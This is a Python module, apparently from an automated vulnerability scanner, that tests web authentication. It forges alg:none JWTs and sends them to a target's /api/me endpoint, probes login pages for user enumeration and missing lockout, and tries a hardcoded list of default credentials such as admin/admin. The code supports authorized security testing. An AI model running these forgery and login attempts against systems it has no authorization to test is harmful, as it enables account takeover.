"""Auth/JWT misconfiguration executor."""

from __future__ import annotations

import base64
import json

from wth_ai.executor.vuln.base import BaseVulnExecutor
from wth_ai.models import ExecutorResult, ExecutorTask


class AuthVulnExecutor(BaseVulnExecutor):
    vuln_type = "auth_jwt"

    def execute(self, task: ExecutorTask) -> ExecutorResult:
        jwt = self.state.metadata.get("captured_jwt", "")
        for role in self.sessions.roles.values():
            if role.jwt:
                jwt = role.jwt
                break

        if not jwt or jwt.count(".") != 2:
            # Sebelumnya di sini pengujian BERHENTI kalau tidak ada JWT — padahal
            # permukaan auth yang paling sering diuji adalah login itu sendiri.
            # Sekarang: probe login (bounded, rate-limited), lalu baru melaporkan
            # bahwa JWT tidak ada bila probe tidak menemukan apa-apa.
            probe = self._probe_login(task)
            if probe is not None:
                return probe
            return self._result(
                task, status="success",
                summary="No JWT captured — login pertama atau set metadata captured_jwt",
                evidence=[], observations=["Jalankan dengan sesi terautentikasi untuk uji JWT"],
                risk="low",
            )

        header_b64, payload_b64, sig = jwt.split(".")
        evidence: list[str] = []
        observations: list[str] = []

        try:
            pad = lambda s: s + "=" * (-len(s) % 4)
            header = json.loads(base64.urlsafe_b64decode(pad(header_b64)))
            payload = json.loads(base64.urlsafe_b64decode(pad(payload_b64)))
            observations.append(f"alg={header.get('alg')}")
            if header.get("alg", "").lower() == "none":
                evidence.append("JWT uses alg:none")
            if "exp" not in payload:
                evidence.append("JWT missing exp claim")
            if payload.get("role") == "admin" or payload.get("admin") is True:
                observations.append("Token contains admin claim")
        except Exception as exc:
            observations.append(f"JWT parse error: {exc}")

        forged = self._forge_alg_none(header_b64, payload_b64)
        if forged:
            import requests
            test_url = task.target if task.target.startswith("http") else f"https://{task.target}/api/me"
            try:
                r = requests.get(test_url, headers={"Authorization": f"Bearer {forged}"}, timeout=10)
                if r.status_code == 200:
                    evidence.append("alg:none forged token accepted")
                    observations.append(f"forged_status={r.status_code}")
            except Exception:
                pass

        return self._result(
            task, status="success",
            summary="JWT misconfiguration checks",
            evidence=evidence, observations=observations,
            risk="critical" if "alg:none" in " ".join(evidence) else "medium",
        )

    #: Daftar SANGAAT pendek dan sengaja: ini pemeriksaan kredensial DEFAULT, bukan
    #: serangan kamus. Batas proyek melarang brute force login, dan lima percobaan
    #: tidak membebani target.
    DEFAULT_CREDS = (("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
                     ("admin", "123456"), ("root", "root"))
    BOGUS_USER = "wth-no-such-user-9z8y7"
    MAX_ATTEMPTS = 6

    def _throttle(self) -> None:
        import time

        rps = float(getattr(self.state.scope, "rate_limit_rps", 2.0) or 2.0)
        time.sleep(max(0.0, 1.0 / max(0.1, rps)))

    def _login_request(self, url: str, user: str, password: str):
        """Satu percobaan login. Bentuk mengikuti URL: query params kalau ada,
        kalau tidak POST form ke path yang sama."""
        import requests
        from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        user_key = next((k for k in params if k.lower() in ("user", "username", "email", "login")), None)
        pass_key = next((k for k in params if k.lower() in ("pw", "pass", "password", "passwd")), None)

        self._throttle()
        if user_key and pass_key:
            mutated = dict(params)
            mutated[user_key] = [user]
            mutated[pass_key] = [password]
            attempt = urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))
            r = requests.get(attempt, timeout=10, allow_redirects=False)
            return attempt, r.status_code, r.text
        # POST form
        form = {"username": user, "password": password, "user": user, "pass": password}
        r = requests.post(url, data=form, timeout=10, allow_redirects=False)
        return url, r.status_code, r.text

    def _probe_login(self, task: ExecutorTask) -> ExecutorResult | None:
        """Enumerasi user, deteksi tanpa-lockout, dan kredensial default."""
        url = task.target
        if not url.startswith("http"):
            url = f"https://{url}"
        lowered = url.lower()
        if not any(token in lowered for token in ("login", "signin", "auth", "session")):
            return None

        evidence: list[str] = []
        observations: list[str] = []
        pairs: list[dict] = []

        try:
            # 1) enumerasi: user yang (mungkin) ada vs user yang pasti tidak ada
            u1, s1, b1 = self._login_request(url, "admin", "wth-salah-9z8y7")
            u2, s2, b2 = self._login_request(url, self.BOGUS_USER, "wth-salah-9z8y7")
            pairs.append({"method": "GET/POST", "url": u1, "response_status": s1, "body_snippet": b1[:400]})
            pairs.append({"method": "GET/POST", "url": u2, "response_status": s2, "body_snippet": b2[:400]})
            observations.append(f"bad-user-existing status={s1} len={len(b1)}")
            observations.append(f"bad-user-missing  status={s2} len={len(b2)}")
            if (s1, len(b1)) != (s2, len(b2)) or b1.strip() != b2.strip():
                evidence.append(
                    "Enumerasi user: respons berbeda antara user yang ada dan yang tidak ada "
                    "(pesan/ukuran/status berbeda)"
                )
        except Exception as exc:  # noqa: BLE001
            observations.append(f"login probe gagal: {type(exc).__name__}")
            return None

        # 2) tanpa lockout: ulangi beberapa kali, lihat apakah ada throttle/lock
        locked = False
        try:
            for _ in range(self.MAX_ATTEMPTS - 2):
                _u, s, b = self._login_request(url, "admin", "wth-salah-9z8y7")
                body_low = (b or "").lower()
                if s in (429, 423) or "too many" in body_low or "locked" in body_low or "terkunci" in body_low:
                    locked = True
                    break
            observations.append(f"lockout setelah {self.MAX_ATTEMPTS - 2} percobaan: {locked}")
            if not locked:
                evidence.append(
                    f"Tidak ada lockout/throttle terdeteksi setelah {self.MAX_ATTEMPTS - 2} percobaan "
                    "gagal (jumlah kecil: ini sinyal, bukan bukti)"
                )
        except Exception:  # noqa: BLE001
            pass

        # 3) kredensial default (daftar pendek)
        for user, password in self.DEFAULT_CREDS:
            try:
                u, s, b = self._login_request(url, user, password)
            except Exception:  # noqa: BLE001
                continue
            body_low = (b or "").lower()
            failed = any(k in body_low for k in ("invalid", "wrong", "incorrect", "salah", "gagal", "denied"))
            if s == 200 and not failed:
                evidence.append(f"KREDENSIAL DEFAULT DITERIMA: {user}/{password}")
                pairs.append({"method": "GET/POST", "url": u, "response_status": s, "body_snippet": b[:400]})
                return self._result(
                    task, status="success",
                    summary=f"Login default diterima di {url[:70]}",
                    evidence=evidence, observations=observations, risk="high",
                    request_pairs=pairs,
                )

        # Lockout yang ADA bukan temuan (itu postur yang baik), tapi tetap hasil:
        # sebelumnya observasi ini dibuang dan operator hanya melihat "No JWT
        # captured", seolah login tidak diuji sama sekali. Sekarang hasil probe
        # selalu dilaporkan; risikonya rendah saat tidak ada bukti.
        if not evidence and not observations:
            return None
        return self._result(
            task, status="success",
            summary=(
                f"Probe login pada {url[:70]} — "
                + (f"{len(evidence)} sinyal" if evidence else "tidak ada sinyal lemah")
            ),
            evidence=evidence, observations=observations,
            risk="medium" if evidence else "low", request_pairs=pairs,
        )

    def _forge_alg_none(self, header_b64: str, payload_b64: str) -> str:
        try:
            pad = lambda s: s + "=" * (-len(s) % 4)
            header = json.loads(base64.urlsafe_b64decode(pad(header_b64)))
            header["alg"] = "none"
            new_h = base64.urlsafe_b64encode(json.dumps(header, separators=(",", ":")).encode()).rstrip(b"=").decode()
            return f"{new_h}.{payload_b64}."
        except Exception:
            return ""
